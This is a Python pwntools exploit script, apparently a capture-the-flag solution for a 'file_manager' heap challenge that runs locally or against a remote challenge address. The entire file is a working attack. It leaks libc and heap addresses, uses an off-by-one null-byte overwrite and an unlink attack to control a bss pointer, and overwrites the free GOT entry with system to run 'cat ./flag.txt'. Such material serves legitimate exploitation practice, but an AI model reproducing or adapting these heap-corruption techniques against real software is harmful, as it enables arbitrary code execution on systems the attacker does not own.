from pwn import *

elf_name = "./file_manager"
elf = ELF(elf_name)

LD_LOCAL = True

heap_off = 0x7513F0-0x751000
uk_bss_addr = 0x602618

if LD_LOCAL:
    #context.log_level = "debug"
    io = process(elf_name)
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    arena_off = 0x7F1A90809B78 - 0x0007F1A90445000
    pprdx = 0x0000000000001b92
else:
    #context.log_level = "debug"
    lb_name = "./libc6_219"
    libc = ELF(lb_name)
    menv = {'LD_PRELOAD': lb_name}
    io = remote("124.16.75.162", 40002)


def mmenu(idx):
    io.recvuntil("6.exit.")
    io.recvuntil("=======================\n")
    io.sendline(str(idx))


def dlySend(content):
    io.send(content)
    sleep(0.1)

def fcreate(filename, length, content):
    mmenu(1)
    io.recvuntil("filename:")
    dlySend(filename)
    io.recvuntil("the length:")
    io.sendline(str(length))
    io.recvuntil("content:\n")
    dlySend(content)

def fedit(idx, content):
    mmenu(2)
    io.recvuntil("the index:")
    io.sendline(str(idx))
    io.recvuntil("input content:\n")
    dlySend(content)

def fview(idx):
    mmenu(3)
    io.recvuntil("nput the index:\n")
    io.sendline(str(idx))

def fdelete(idx):
    mmenu(4)
    io.recvuntil("the index:\n")
    io.sendline(str(idx))

def flist(idx):
    mmenu(5)

def pwnit():
    fcreate("idx0", 0x100, 'a'*0x40)
    fcreate("idx1", 0x100, 'a'*0x40)
    fcreate("idx2", 0x100, 'a'*0x40)
    fcreate("idx3", 0x100, 'a'*0x40)
    fcreate("idx4", 0x100, 'a'*0x40)
    fcreate("idx5", 0x100, 'a'*0x40)
    fcreate("idx6", 0x100, 'a'*0x40)
    # leak libc
    fdelete(1)
    fcreate("idx1", 0x100, 'a'*0x7+chr(0))
    fedit(1, 'a'*0x08)
    fview(1)
    io.recvuntil("idx1 | ")
    io.recvuntil('a'*0x8)

    log.success("system off address : " + hex(libc.symbols['system']))
    #data = io.recvline()[:-1]
    #arena_addr = u64(data.ljust(8, chr(0)))
    #libc.address = arena_addr - arena_off
    #log.success("libc address : " + hex(libc.address))
    # leak heap
    fdelete(1)
    fdelete(3)
    fdelete(5)
    fcreate("idx1", 0x100, 'a'*0x07+chr(0))
    fedit(1, 'a'*0x08)
    fview(1)
    io.recvuntil("idx1 | ")
    io.recvuntil('a'*0x8)
    data = io.recvline()[:-1]
    heap_addr = u64(data.ljust(8, chr(0))) - heap_off
    log.success("heap address : " + hex(heap_addr))
    fcreate("idx3", 0x100, 'a'*0x40)
    fcreate("idx5", 0x100, 'a'*0x40)

    # pwn
    fcreate("pwn7", 0x28, 'a'*8+chr(0))
    fdelete(7)
    fcreate("pwn7", 0xf8, 'f'*8+chr(0))
    fcreate("pwn8", 0x100, 'e'*8+chr(0))
    payload = 'a'*0xf8 + p64(0x110)[:2] + chr(0)  # chunk size
    fcreate("cat ./flag.txt\x00", 0x100, payload)

    fdelete(7)
    fcreate("pwn7", 0xf8, 'f'*8)
    # unlink
    payload = p64(0) + p64(0xF1)
    payload += p64(uk_bss_addr-0x18) + p64(uk_bss_addr-0x10)
    payload += 'k'*0xd0 + p64(0xF0)
    fedit(7, payload)
    fdelete(8)
    raw_input("check.")

    # leak more
    payload = p64(elf.got['puts']) + p64(elf.got['__libc_start_main'])
    fedit(7, payload)
    fview(6)
    io.recvuntil(str(6))
    io.recvuntil(" | ")
    data = io.recvuntil(" | ")[:-3]
    puts_addr = u64(data.ljust(8, chr(0)))
    log.success("puts address : " + hex(puts_addr))
    data = io.recvline()[:-1]
    lib_start = u64(data.ljust(8, chr(0)))
    log.success("lib main address : " + hex(lib_start))
    libc.address = puts_addr - libc.symbols['puts']
    log.success("lib address : " + hex(libc.address))


    # pwn
    payload = p64(heap_addr+0x900) + p64(elf.got['free'])
    fedit(7, payload)
    fedit(6, p64(libc.symbols["system"]))

    pause()
    mmenu(4)
    io.recvuntil("the index:\n")
    io.sendline(str(9))
    #io.interactive()
    print io.recvline()
    print io.recvline()
    print io.recvline()
    print io.recvline()

if __name__ == "__main__":
    pwnit()
    pause()


